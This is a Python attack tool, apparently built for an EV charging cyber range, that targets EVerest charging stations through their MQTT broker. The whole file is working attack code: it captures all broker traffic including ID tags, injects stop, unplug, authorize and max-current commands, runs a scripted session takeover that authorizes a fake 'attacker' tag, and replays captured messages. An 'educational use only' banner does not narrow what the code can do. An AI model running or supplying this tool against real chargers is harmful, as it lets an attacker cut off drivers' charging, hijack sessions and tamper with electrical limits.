#!/usr/bin/env python3
"""
EV-CyberRange Session Hijacker
Demonstrates charging session manipulation attacks on EVSE via MQTT.

EDUCATIONAL USE ONLY - For authorized security testing.

Usage:
    python3 session_hijacker.py --target everest-mqtt --mode monitor
    python3 session_hijacker.py --target everest-mqtt --mode inject --action stop
    python3 session_hijacker.py --target everest-mqtt --mode takeover
"""

import argparse
import json
import os
import sys
import time
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from typing import Optional

try:
    import paho.mqtt.client as mqtt
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel
except ImportError:
    print("Installing required packages...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paho-mqtt", "rich"])
    import paho.mqtt.client as mqtt
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel

console = Console()


class AttackMode(Enum):
    MONITOR = "monitor"
    INJECT = "inject"
    TAKEOVER = "takeover"
    REPLAY = "replay"


@dataclass
class ChargingSession:
    connector_id: int
    state: str
    energy_wh: float = 0.0
    power_w: float = 0.0
    voltage_v: float = 0.0
    current_a: float = 0.0
    max_current_a: float = 32.0
    id_tag: Optional[str] = None
    session_id: Optional[str] = None
    last_update: Optional[datetime] = None


class SessionHijacker:
    # Known EVerest command topics
    COMMAND_TOPICS = {
        "pause": "everest_external/nodered/{connector}/cmd/pause_charging",
        "resume": "everest_external/nodered/{connector}/cmd/resume_charging",
        "stop": "everest_external/nodered/{connector}/cmd/stop_transaction",
        "start": "everest_external/nodered/{connector}/cmd/start_charging",
        "plug_in": "everest_external/nodered/{connector}/cmd/plug_in",
        "unplug": "everest_external/nodered/{connector}/cmd/unplug",
        "set_max_current": "everest_external/nodered/{connector}/cmd/set_max_current",
        "authorize": "everest_external/nodered/{connector}/cmd/authorize",
    }
    
    def __init__(self, host: str, port: int = 1883):
        self.host = host
        self.port = port
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, 
                                   f"hijacker-{os.getpid()}")
        self.sessions: dict[int, ChargingSession] = {}
        self.captured_messages: list[dict] = []
        self.connected = False
        
    def connect(self) -> bool:
        try:
            self.client.on_connect = self._on_connect
            self.client.on_message = self._on_message
            self.client.on_disconnect = self._on_disconnect
            self.client.connect(self.host, self.port, 60)
            self.client.loop_start()
            time.sleep(1)
            return self.connected
        except Exception as e:
            console.print(f"[red]Connection failed: {e}[/red]")
            return False
    
    def _on_connect(self, client, userdata, flags, rc, properties=None):
        if rc == 0:
            self.connected = True
            console.print(f"[green]Connected to MQTT broker[/green]")
            # Subscribe to all EVerest topics
            client.subscribe("everest_api/#")
            client.subscribe("everest_external/#")
            client.subscribe("everest-telemetry/#")
        else:
            console.print(f"[red]Connection failed: {rc}[/red]")
    
    def _on_disconnect(self, client, userdata, rc, properties=None):
        self.connected = False
        if rc != 0:
            console.print(f"[yellow]Unexpected disconnect: {rc}[/yellow]")
    
    def _on_message(self, client, userdata, msg):
        """Process incoming MQTT messages and update session state."""
        topic = msg.topic
        
        # Capture all messages for replay
        self.captured_messages.append({
            "topic": topic,
            "payload": msg.payload.decode("utf-8", errors="replace"),
            "timestamp": datetime.now().isoformat(),
        })
        
        # Only keep last 1000 messages
        if len(self.captured_messages) > 1000:
            self.captured_messages = self.captured_messages[-1000:]
        
        try:
            payload = json.loads(msg.payload.decode())
        except:
            return
        
        # Parse connector ID from topic
        connector_id = None
        if "connector_" in topic:
            for part in topic.split("/"):
                if part.startswith("connector_"):
                    try:
                        connector_id = int(part.replace("connector_", ""))
                    except:
                        pass
        
        if connector_id is None:
            connector_id = 1  # Default
        
        # Initialize session if needed
        if connector_id not in self.sessions:
            self.sessions[connector_id] = ChargingSession(connector_id=connector_id, state="Unknown")
        
        session = self.sessions[connector_id]
        session.last_update = datetime.now()
        
        # Update session based on topic
        if "session_info" in topic:
            session.state = payload.get("state", session.state)
            session.id_tag = payload.get("id_tag")
            session.session_id = payload.get("session_id")
            
        elif "powermeter" in topic:
            session.energy_wh = payload.get("energy_Wh_import", session.energy_wh)
            session.power_w = payload.get("power_W", session.power_w)
            session.voltage_v = payload.get("voltage_V", {}).get("L1", session.voltage_v)
            session.current_a = payload.get("current_A", {}).get("L1", session.current_a)
            
        elif "limits" in topic:
            session.max_current_a = payload.get("max_current", session.max_current_a)
    
    def monitor_sessions(self, duration: int = 60):
        """Live monitor of charging sessions."""
        console.print(f"[cyan]Monitoring charging sessions for {duration}s...[/cyan]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")
        
        def generate_table() -> Table:
            table = Table(title="Active Charging Sessions")
            table.add_column("Conn", style="cyan", width=4)
            table.add_column("State", style="green", width=20)
            table.add_column("Power", style="yellow", width=10)
            table.add_column("Energy", style="blue", width=10)
            table.add_column("Current", style="magenta", width=10)
            table.add_column("Max A", style="red", width=8)
            table.add_column("ID Tag", style="white", width=15)
            
            for conn_id, session in sorted(self.sessions.items()):
                table.add_row(
                    str(session.connector_id),
                    session.state,
                    f"{session.power_w:.0f} W",
                    f"{session.energy_wh:.0f} Wh",
                    f"{session.current_a:.1f} A",
                    f"{session.max_current_a:.0f} A",
                    session.id_tag or "-",
                )
            
            return table
        
        try:
            with Live(generate_table(), refresh_per_second=2) as live:
                start = time.time()
                while time.time() - start < duration:
                    time.sleep(0.5)
                    live.update(generate_table())
        except KeyboardInterrupt:
            console.print("\n[yellow]Monitoring stopped[/yellow]")
    
    def inject_command(self, action: str, connector: int = 1, value: Optional[str] = None) -> bool:
        """Inject a command to manipulate charging session."""
        if action not in self.COMMAND_TOPICS:
            console.print(f"[red]Unknown action: {action}[/red]")
            console.print(f"[yellow]Available: {list(self.COMMAND_TOPICS.keys())}[/yellow]")
            return False
        
        topic = self.COMMAND_TOPICS[action].format(connector=connector)
        
        # Build payload
        if action == "set_max_current" and value:
            payload = json.dumps({"max_current_A": float(value)})
        elif action == "authorize" and value:
            payload = json.dumps({"id_tag": value})
        else:
            payload = json.dumps({"command": action, "timestamp": datetime.now().isoformat()})
        
        console.print(f"[red]⚡ INJECTING: {action}[/red]")
        console.print(f"   Topic: {topic}")
        console.print(f"   Payload: {payload}")
        
        result = self.client.publish(topic, payload, qos=1)
        
        if result.rc == 0:
            console.print(f"[green]✓ Command injected successfully[/green]")
            return True
        else:
            console.print(f"[red]✗ Injection failed: {result.rc}[/red]")
            return False
    
    def takeover_session(self, connector: int = 1):
        """Attempt full session takeover - stop current, start new with attacker ID."""
        console.print(Panel(
            "[bold red]SESSION TAKEOVER ATTACK[/bold red]\n"
            f"Target: Connector {connector}\n"
            "Steps:\n"
            "1. Stop current transaction\n"
            "2. Wait for state change\n"
            "3. Authorize with attacker ID\n"
            "4. Start new charging session",
            border_style="red"
        ))
        
        # Step 1: Stop current session
        console.print("\n[yellow]Step 1: Stopping current session...[/yellow]")
        self.inject_command("stop", connector)
        time.sleep(2)
        
        # Step 2: Unplug (reset state)
        console.print("[yellow]Step 2: Simulating unplug...[/yellow]")
        self.inject_command("unplug", connector)
        time.sleep(2)
        
        # Step 3: Plug in again
        console.print("[yellow]Step 3: Simulating plug in...[/yellow]")
        self.inject_command("plug_in", connector)
        time.sleep(2)
        
        # Step 4: Authorize with attacker ID
        console.print("[yellow]Step 4: Authorizing with attacker ID...[/yellow]")
        self.inject_command("authorize", connector, "ATTACKER-TAG-001")
        time.sleep(2)
        
        # Step 5: Start charging
        console.print("[yellow]Step 5: Starting charging session...[/yellow]")
        self.inject_command("start", connector)
        
        console.print("\n[bold green]Takeover sequence complete![/bold green]")
        console.print("[yellow]Monitor session state to verify success[/yellow]")
    
    def replay_attack(self, filter_topic: Optional[str] = None, count: int = 10):
        """Replay captured messages."""
        console.print(f"[cyan]Replaying {count} captured messages...[/cyan]")
        
        messages = self.captured_messages
        if filter_topic:
            messages = [m for m in messages if filter_topic in m["topic"]]
        
        messages = messages[-count:]
        
        for msg in messages:
            console.print(f"[yellow]Replaying: {msg['topic']}[/yellow]")
            self.client.publish(msg["topic"], msg["payload"], qos=0)
            time.sleep(0.1)
        
        console.print(f"[green]Replayed {len(messages)} messages[/green]")
    
    def export_captures(self, filename: str):
        """Export captured messages to JSON."""
        with open(filename, "w") as f:
            json.dump(self.captured_messages, f, indent=2)
        console.print(f"[green]Exported {len(self.captured_messages)} messages to {filename}[/green]")
    
    def disconnect(self):
        self.client.loop_stop()
        self.client.disconnect()


def main():
    parser = argparse.ArgumentParser(description="EV-CyberRange Session Hijacker")
    parser.add_argument("--target", "-t", default=os.getenv("MQTT_HOST", "localhost"),
                        help="MQTT broker hostname")
    parser.add_argument("--port", "-p", type=int, default=int(os.getenv("MQTT_PORT", 1883)),
                        help="MQTT broker port")
    parser.add_argument("--mode", "-m", choices=["monitor", "inject", "takeover", "replay"],
                        default="monitor", help="Attack mode")
    parser.add_argument("--connector", "-c", type=int, default=1, help="Target connector ID")
    parser.add_argument("--action", "-a", help="Inject action (stop, start, pause, etc.)")
    parser.add_argument("--value", "-v", help="Value for action (e.g., max_current)")
    parser.add_argument("--duration", "-d", type=int, default=60, help="Monitor duration")
    parser.add_argument("--export", "-e", help="Export captures to file")
    
    args = parser.parse_args()
    
    console.print(Panel.fit(
        "[bold red]EV-CyberRange Session Hijacker[/bold red]\n"
        "[yellow]EDUCATIONAL USE ONLY - Authorized testing only[/yellow]",
        border_style="red"
    ))
    
    hijacker = SessionHijacker(args.target, args.port)
    
    if not hijacker.connect():
        sys.exit(1)
    
    try:
        if args.mode == "monitor":
            hijacker.monitor_sessions(args.duration)
            
        elif args.mode == "inject":
            if not args.action:
                console.print("[red]--action required for inject mode[/red]")
                console.print(f"[yellow]Available: {list(SessionHijacker.COMMAND_TOPICS.keys())}[/yellow]")
                sys.exit(1)
            hijacker.inject_command(args.action, args.connector, args.value)
            
        elif args.mode == "takeover":
            hijacker.takeover_session(args.connector)
            
        elif args.mode == "replay":
            # First capture some messages
            console.print("[yellow]Capturing messages for 10s...[/yellow]")
            time.sleep(10)
            hijacker.replay_attack(count=20)
        
        if args.export:
            hijacker.export_captures(args.export)
            
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted[/yellow]")
    finally:
        hijacker.disconnect()


if __name__ == "__main__":
    main()
